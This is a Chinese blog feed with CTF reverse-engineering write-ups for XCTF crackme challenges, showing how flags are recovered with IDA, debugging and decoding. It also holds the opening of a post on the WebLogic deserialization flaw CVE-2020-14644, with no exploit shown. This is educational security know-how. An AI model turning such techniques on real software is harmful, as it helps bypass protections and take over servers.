<h5 id="0x3-logmein"><a href="#0x3-logmein" class="headerlink" title="0x3 logmein"></a>0x3 logmein</h5><p>查看下载的文件</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022174115535.png" alt="image-20201022174115535"></p>
<p>用IDA找到对应关键字进行分析</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022174143070.png" alt="image-20201022174143070"></p>
<p>重点函数：</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201023171541380.png" alt="image-20201023171541380"></p>
<p>编写脚本即可</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201023171351848.png" alt="image-20201023171351848"></p>
<p>注意：小端模式</p>
<h5 id="0x4-insanity"><a href="#0x4-insanity" class="headerlink" title="0x4 insanity"></a>0x4 insanity</h5><p>下载文件后直接编辑器就能查看到flag</p>
<h5 id="0x5-getit"><a href="#0x5-getit" class="headerlink" title="0x5 getit"></a>0x5 getit</h5><p>IDA中反编译</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022174234603.png" alt="image-20201022174234603"></p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022174338459.png" alt="image-20201022174338459"></p>
<p>可以看到t就是flag，我们需要知道？的数值，编写脚本即可得到flag</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022111119084.png" alt="image-20201022111119084"></p>
<p>此题注意：python中字符串是不可以直接操作修改的，可以先改为列表，然后重新生成</p>
<h5 id="0x6-python-trade"><a href="#0x6-python-trade" class="headerlink" title="0x6 python-trade"></a>0x6 python-trade</h5><p>.pyc后缀的文件，直接用EasyPythonDecompiler解了，获得源码</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/24CD274DE2E7A49AC28DC75BFF631FA2.png" alt="24CD274DE2E7A49AC28DC75BFF631FA2"></p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/CF034599DBEAC7285F7E5C9C744EBB6D.png" alt="CF034599DBEAC7285F7E5C9C744EBB6D"></p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/BB56738DB65555D9FF8F1424320439CB.png" alt="BB56738DB65555D9FF8F1424320439CB"></p>
<p>可以看到操作：对输入的字符串进行自定义的encode操作然后用base64加密</p>
<p>编写脚本解码即得flag</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022113051197.png" alt="image-20201022113051197"></p>
<h5 id="0x7-re1"><a href="#0x7-re1" class="headerlink" title="0x7 re1"></a>0x7 re1</h5><p>放进IDA查看</p>
<p>查看主函数，可以看到只要输入的字符串和v5相同就可以了，找到对应v5的值即可得flag</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022183057868.png" alt="image-20201022183057868"></p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022175340918.png" alt="image-20201022175340918"></p>
<h5 id="0x8-Hello-CTF"><a href="#0x8-Hello-CTF" class="headerlink" title="0x8 Hello,CTF"></a>0x8 Hello,CTF</h5><p>用IDA打开，找到主要函数</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022175837176.png" alt="image-20201022175837176"></p>
<p>从下面的循环判定值为17和上面v13的长度为34猜测出两位代表一个字符</p>
<p>十六进制转ASCII即可得flag</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022175959301.png" alt="image-20201022175959301"></p>
<h5 id="0x9-no-string-attached"><a href="#0x9-no-string-attached" class="headerlink" title="0x9 no-string-attached"></a>0x9 no-string-attached</h5><p>IDA中查看主函数</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180039861.png" alt="image-20201022180039861"></p>
<p>进入每个函数看看</p>
<p>先看banner()</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180101213.png" alt="image-20201022180101213"></p>
<p>就是打印一些东西，查看对应打印的数值（unk_80488B0和8048960）</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180251090.png" alt="image-20201022180251090"></p>
<p>可以看到是两个字符串，就是一些欢迎的信息之类的</p>
<p>查看下一个，也是打印一些信息，需要你输入字符串</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180356018.png" alt="image-20201022180356018"></p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180449834.png" alt="image-20201022180449834"></p>
<p>再看下一个，是主函数了，只要输入的函数和s2相同即可，s2是两个输入进行decrypt操作后得到的值</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180527832.png" alt="image-20201022180527832"></p>
<p>看decrypt,对两个宽字节进行了操作。编写脚本实现功能即可得flag</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180623954.png" alt="image-20201022180623954"></p>
<p> <img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022141847145.png" alt="image-20201022141847145"></p>
<h5 id="0xA-csaw2013reversing2"><a href="#0xA-csaw2013reversing2" class="headerlink" title="0xA csaw2013reversing2"></a>0xA csaw2013reversing2</h5><p>IDA中看主函数</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180506157.png" alt="image-20201022180506157"></p>
<p>通过运行程序，发现并不会进入if的判定。</p>
<p>lpMem+1就是我们需要知道的乱码消息</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181008895.png" alt="image-20201022181008895"></p>
<p>可以知道通过memcpy_s操作将unk_409B10的数据给了lpMem</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181020276.png" alt="image-20201022181020276"></p>
<p>查看sub_401000</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181112925.png" alt="image-20201022181112925"></p>
<p>是对lpMem进行了一些操作的，猜测是由于并没有运行，所以出现乱码</p>
<p>用IDA动态调试（debugger），下断点</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181352168.png" alt="image-20201022181352168"></p>
<p>跳过进入判定后的ExitProcess()，直接跳到下面弹出messageboxA的地方，就能得到flag了</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181317768.png" alt="image-20201022181317768"></p>
<h5 id="0xB-maze"><a href="#0xB-maze" class="headerlink" title="0xB maze"></a>0xB maze</h5><p>看题目就知道是一个迷宫题</p>
<p>IDA中找主函数</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181455862.png" alt="image-20201022181455862"></p>
<p>看到这四个不同函数的判断，猜测应该就是上下左右了</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181522773.png" alt="image-20201022181522773"></p>
<p>分别点进去查看，得知’O’为左，’o’为右，’.’为上，’0’为下，并且在函数中有规定了8这个边界值</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181719854.png" alt="image-20201022181719854"></p>
<p>接下来找迷宫和终点</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181743142.png" alt="image-20201022181743142"></p>
<p>通过最终判定的条件，可以知道终点是’#’</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181833592.png" alt="image-20201022181833592"></p>
<p>601060就是需要找的迷宫</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022183115702.png" alt="image-20201022183115702"></p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022183129721.png" alt="image-20201022183129721"></p>
<p>在HEX界面查看</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181923615.png" alt="image-20201022181923615"></p>
<p>根据边界值8重新排列，23就是终点，只走20即可得flag</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022182143651.png" alt="image-20201022182143651"></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title>0x03Xctf进阶刷题-1</title>
    <url>/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/</url>
    <content><![CDATA[<h4 id="Xctf进阶刷题-1"><a href="#Xctf进阶刷题-1" class="headerlink" title="Xctf进阶刷题-1"></a>Xctf进阶刷题-1</h4><a id="more"></a>

<h5 id="0x01shuffle"><a href="#0x01shuffle" class="headerlink" title="0x01shuffle"></a>0x01shuffle</h5><p>IDA分析即可看到flag</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201028100237540.png" alt="image-20201028100237540"></p>
<h5 id="0x02-reversing-x64elf（python二维数组）"><a href="#0x02-reversing-x64elf（python二维数组）" class="headerlink" title="0x02 reversing-x64elf（python二维数组）"></a>0x02 reversing-x64elf（python二维数组）</h5><p>IDA分析关键函数</p>
<p>可以看到是对输入的值进行了sub_4006FD函数操作然后进行判定</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027174007904.png" alt="image-20201027174007904"></p>
<p>进入函数查看，可以看到是一个计算操作</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027174043472.png" alt="image-20201027174043472"></p>
<p>编写脚本即可得flag</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027175341690.png" alt="image-20201027175341690"></p>
<p><strong>注意：python中二维数组的编写</strong></p>
<h5 id="0x03-guess-the-number（jar包逆向）"><a href="#0x03-guess-the-number（jar包逆向）" class="headerlink" title="0x03 guess-the-number（jar包逆向）"></a>0x03 guess-the-number（jar包逆向）</h5><p>是一个java程序，直接解压jar包，查看.class源码，可以看到是对两个字符串进行操作</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027183024987.png" alt="image-20201027183024987"></p>
<p>一开始想要用python编写脚本的，但是xor函数涉及到了Biginter，所以直接改下代码用Java跑</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027183147009.png" alt="image-20201027183147009"></p>
<h5 id="0x04-easyre（python异或）"><a href="#0x04-easyre（python异或）" class="headerlink" title="0x04 easyre（python异或）"></a>0x04 easyre（python异或）</h5><p>IDA分析关键函数，输入字符串为v7，长度为24，并且做了以下操作，其中unk_402158是已知的数据</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201028092543787.png" alt="image-20201028092543787"></p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201028092904689.png" alt="image-20201028092904689"></p>
<p>编写脚本即可跑出flag</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027182905474.png" alt="image-20201027182905474"></p>
<p><strong>注意：Python中异或要加个括号，不加会先运行6-1</strong></p>
<h5 id="0x05-re-for-50-piz（mips）"><a href="#0x05-re-for-50-piz（mips）" class="headerlink" title="0x05 re-for-50-piz（mips）"></a>0x05 re-for-50-piz（mips）</h5><p>IDA分析，发现和以往的代码都不太一样，载入的时候IDA也提示是MIPS</p>
<p>参考：<a href="https://blog.csdn.net/qq_42967398/article/details/94845416">https://blog.csdn.net/qq_42967398/article/details/94845416</a></p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201028100333224.png" alt="image-20201028100333224"></p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201028100408292.png" alt="image-20201028100408292"></p>
<h5 id="0x06-dmd-50"><a href="#0x06-dmd-50" class="headerlink" title="0x06 dmd-50"></a>0x06 dmd-50</h5><p>IDA分析关键函数，要求输入Key的值</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027182604719.png" alt="image-20201027182604719"></p>
<p>可以看到输出，所以需要进下面的判定</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027182542427.png" alt="image-20201027182542427"></p>
<p>所以输入要等于41里的值，将41的值拖出来用Md5解密即可</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027182629949.png" alt="image-20201027182629949"></p>
<h5 id="0x07-parallel-comparator-200（爆破）"><a href="#0x07-parallel-comparator-200（爆破）" class="headerlink" title="0x07 parallel-comparator-200（爆破）"></a>0x07 parallel-comparator-200（爆破）</h5><p>直接可以看源码分析：</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027182101171.png" alt="image-20201027182101171"></p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027180417612.png" alt="image-20201027180417612"></p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027182054092.png" alt="image-20201027182054092"></p>
<p>所以编写一个脚本就可以了</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027180404777.png" alt="image-20201027180404777"></p>
<p><strong>注意：由于生成的是随机数，所以需要爆破一下</strong></p>
<h5 id="0x08-secret-galaxy-300（运行时堆栈中）"><a href="#0x08-secret-galaxy-300（运行时堆栈中）" class="headerlink" title="0x08 secret-galaxy-300（运行时堆栈中）"></a>0x08 secret-galaxy-300（运行时堆栈中）</h5><p>这个题比较神奇</p>
<p>主函数：看到调用了fill和print</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027180024719.png" alt="image-20201027180024719"></p>
<p>fill函数:给一堆变量赋值了</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027180045329.png" alt="image-20201027180045329"></p>
<p>打印出这些值</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027180116127.png" alt="image-20201027180116127"></p>
<p>动态运行看看：</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027180133857.png" alt="image-20201027180133857"></p>
<p>也没有什么输出也没有什么flag的信息</p>
<p>但是在动态调试的时候在堆栈中意外发现了flag</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027180225886.png" alt="image-20201027180225886"></p>
<h5 id="0x09-srm-50（十六进制转字符串）"><a href="#0x09-srm-50（十六进制转字符串）" class="headerlink" title="0x09 srm-50（十六进制转字符串）"></a>0x09 srm-50（十六进制转字符串）</h5><p>IDA分析关键函数</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027175822604.png" alt="image-20201027175822604"></p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027175734844.png" alt="image-20201027175734844"></p>
<p>可以查看到410A80等的值，十六进制转字符串即可，最终可直接看出flag</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201028093014322.png" alt="image-20201028093014322"></p>
<p><img src="/Users/kami/Desktop/%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91/CTF%E9%80%86%E5%90%91%E9%A2%98/typora-user-images/image-20201027175748471.png" alt="image-20201027175748471"></p>
<h5 id="0x0A-simple-check-100（linux动态调试）"><a href="#0x0A-simple-check-100（linux动态调试）" class="headerlink" title="0x0A simple-check-100（linux动态调试）"></a>0x0A simple-check-100（linux动态调试）</h5><p>IDA分析关键函数，是对输入的Key进行一个check操作，然后会对v8运行interesting_function</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027174951320.png" alt="image-20201027174951320"></p>
<p>check函数：</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027175030634.png" alt="image-20201027175030634"></p>
<p>interesting函数：可以看到是v3和flag_data做异或</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027175211284.png" alt="image-20201027175211284"></p>
<p>Flagdata：</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027175058496.png" alt="image-20201027175058496"></p>
<p>有点复杂，选择动态调试，想看看直接绕过输出，结果是一堆乱码</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027175502311.png" alt="image-20201027175502311"></p>
<p>最后得知需要在Linux下进行动态调试，即可得到flag</p>
<h5 id="0x0B-Mysterious（atoi函数）"><a href="#0x0B-Mysterious（atoi函数）" class="headerlink" title="0x0B Mysterious（atoi函数）"></a>0x0B Mysterious（atoi函数）</h5><p>IDA分析关键函数，可以看到只要知道v5的内容就可以了</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027174533035.png" alt="image-20201027174533035"></p>
<p>一开始去分析atoi函数了，但是分析了半天没有弄懂，后来发现这是固定的函数，和itoa对应，是字符串如’123’转整数123</p>
<p>char *itoa (int value, char *str, int base ); </p>
<p>返回值：返回指向str的指针，无错误返回。</p>
<p>int value 被转换的整数，char *string 转换后储存的字符数组，int radix 转换进制数，如2,8,10,16 进制等，大小应在2-36之间。</p>
<p>所以输入的字符串为’122xyz’，即可得到flag</p>
<h5 id="0x0C-newbie-calculations（计算器思路）"><a href="#0x0C-newbie-calculations（计算器思路）" class="headerlink" title="0x0C newbie_calculations（计算器思路）"></a>0x0C newbie_calculations（计算器思路）</h5><p>看题目知道这是个计算器题</p>
<p>IDA分析，函数调用很复杂</p>
<p>参考：<a href="https://www.cnblogs.com/DirWang/p/11586159.html">https://www.cnblogs.com/DirWang/p/11586159.html</a></p>
<p>思路就是：因为没有输入，所以只是对固定数值进行的计算操作，对出现的401100，401000,401220函数进行分析，然后自己用熟悉的语言重写一下，然后复制这段代码运行即可得出flag</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027173642989.png" alt="image-20201027173642989"></p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027173844498.png" alt="image-20201027173844498"></p>
<h5 id="0x0D-re1-100"><a href="#0x0D-re1-100" class="headerlink" title="0x0D re1-100"></a>0x0D re1-100</h5><p>IDA分析，关键函数：</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027172611785.png" alt="image-20201027172611785"></p>
<p>可以看出输入就是bufWrite</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027172650353.png" alt="image-20201027172650353"></p>
<p>所以输入字符串的长度为42，第一位和最后一位分别是{}，前十位是53fc275d81,后十位是4938ae4efd，最后经过一个混淆，要等于下面那个字符串</p>
<p>查看混淆的代码，就是分块处理了下各个字符串，换了下位置</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027173036364.png" alt="image-20201027173036364"></p>
<p>最终换回来就得到flag了</p>
<h5 id="0x0E-answer-to-everything"><a href="#0x0E-answer-to-everything" class="headerlink" title="0x0E answer_to_everything"></a>0x0E answer_to_everything</h5><p>IDA分析关键函数</p>
<p>所以只要输入42，就可以得到一串字符：Cipher from Bill \nSubmit without any tags\n#kdudpeh</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027173507303.png" alt="image-20201027173507303"></p>
<p>根据题目提示sha1加密和不需要加tag，变化一下就可以得到flag了</p>
<h5 id="0x0F-elrond32"><a href="#0x0F-elrond32" class="headerlink" title="0x0F elrond32"></a>0x0F elrond32</h5><h5 id="0x10-tt3441810"><a href="#0x10-tt3441810" class="headerlink" title="0x10 tt3441810"></a>0x10 tt3441810</h5><h5 id="0x11-re2-cpp-is-awesome（dword-dd）"><a href="#0x11-re2-cpp-is-awesome（dword-dd）" class="headerlink" title="0x11 re2-cpp-is-awesome（dword/dd）"></a>0x11 re2-cpp-is-awesome（dword/dd）</h5><p>IDA看看</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201102151235206.png" alt="image-20201102151235206"></p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201102151429640.png" alt="image-20201102151429640"></p>
<p>这个是主函数</p>
<p>可以看到sub_400B56函数：</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201102151302390.png" alt="image-20201102151302390"></p>
<p>和sub_400B73函数</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201102151145960.png" alt="image-20201102151145960"></p>
<p>所以我们得知要满足判定条件</p>
<p>我们可以看到off_6020A0和dword_6020C0</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201102151547732.png" alt="image-20201102151547732"></p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201102151634166.png" alt="image-20201102151634166"></p>
<p>那么我们只要编写脚本，满足判定条件即可</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201103161236507.png" alt="image-20201103161236507"></p>
<p><strong>注意</strong>：dword代表是4个字节一位，align8代表8字节对齐，所以在0x24和5之间是有一个0的，汇编中dd代表4字节，dw代表2字节，db代表1字节</p>
<h5 id="0x12-re4-unvm-me（python3的int-函数和md5加解密）"><a href="#0x12-re4-unvm-me（python3的int-函数和md5加解密）" class="headerlink" title="0x12 re4-unvm-me（python3的int()函数和md5加解密）"></a>0x12 re4-unvm-me（python3的int()函数和md5加解密）</h5><p>是个后缀pyc的文件</p>
<p>直接拖进软件解出源码</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201102173720552.png" alt="image-20201102173720552"></p>
<p>只要将md5s中的数字转成十六进制后找md5解密网站解密即可，其中有一个少一位的在首位补上0</p>
<p><strong>注意</strong>：#int(‘0x’+n.hexdigest(),16))是将一个十六进制字符串（添加了’0x’让其变成了十六进制）转成十进制</p>
<h5 id="0x13-流浪者"><a href="#0x13-流浪者" class="headerlink" title="0x13 流浪者"></a>0x13 流浪者</h5><p>解开压缩包，是一个exe，运行，发现需要输入字符串然后点击验证按钮</p>
<p>放入IDA分析，在import里寻找getwindowstext函数，果然有</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201103155558866.png" alt="image-20201103155558866"></p>
<p>找到对应调用的函数，可以看到对输入的字符串进行了一些操作</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201103155618140.png" alt="image-20201103155618140"></p>
<p>跟下去看sub_4017F0,看到是根据变换后的字符串，然后再和aA这个数组进行变换，因为是dword类型，是四字节一位的，所以a1+4*v4就相当于a1[v4]，变换完后和对应字符串比较</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201103155652535.png" alt="image-20201103155652535"></p>
<p>aA这个数组如下：</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201103155847933.png" alt="image-20201103155847933"></p>
<p>那么我们就可以编写脚本，最终可得到flag，其中对j判断的0，9，10等数字就是从字符串第一次变换里得到的范围</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201103161208429.png" alt="image-20201103161208429"></p>
<h5 id="第一页题目完成"><a href="#第一页题目完成" class="headerlink" title="第一页题目完成:"></a>第一页题目完成:</h5><p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201103160209798.png" alt="image-20201103160209798"></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title>0x03CVE-2020-14644 weblogic iiop反序列化漏洞分析</title>
    <url>/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="CVE-2020-14644-weblogic-iiop反序列化漏洞分析"><a href="#CVE-2020-14644-weblogic-iiop反序列化漏洞分析" class="headerlink" title="CVE-2020-14644 weblogic iiop反序列化漏洞分析"></a>CVE-2020-14644 weblogic iiop反序列化漏洞分析</h3><p>参考：</p>
<p>0x1 <a href="https://my.oschina.net/u/4280983/blog/4477476">https://my.oschina.net/u/4280983/blog/4477476</a></p>
<p>0x2 宽字节的推文</p>
<a id="more"></a>

<h4 id="0x1-漏洞介绍"><a href="#0x1-漏洞介绍" class="headerlink" title="0x1 漏洞介绍"></a>0x1 漏洞介绍</h4><h5 id="0x01-WebLogic组件"><a href="#0x01-WebLogic组件" class="headerlink" title="0x01 WebLogic组件"></a>0x01 WebLogic组件</h5><p>WebLogic是美国Oracle公司出品的一个application server，是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器，适用于云环境和传统环境的应用服务器组件。</p>
<h5 id="0x02-漏洞简介"><a href="#0x02-漏洞简介" class="headerlink" title="0x02 漏洞简介"></a>0x02 漏洞简介</h5><p>Oracle官方在2020年7月份发布的最新安全补丁中披露了此漏洞。此漏洞CVSS评分9.8，<strong>受影响的版本是12.2.1.3.0、12.2.1.4.0和14.1.1.0.0</strong>。该漏洞允许未经身份验证的攻击者通过 IIOP , T3 进行网络访问，攻击者成功攻击此漏洞可能导致Oracle WebLogic Server被接管。</p>
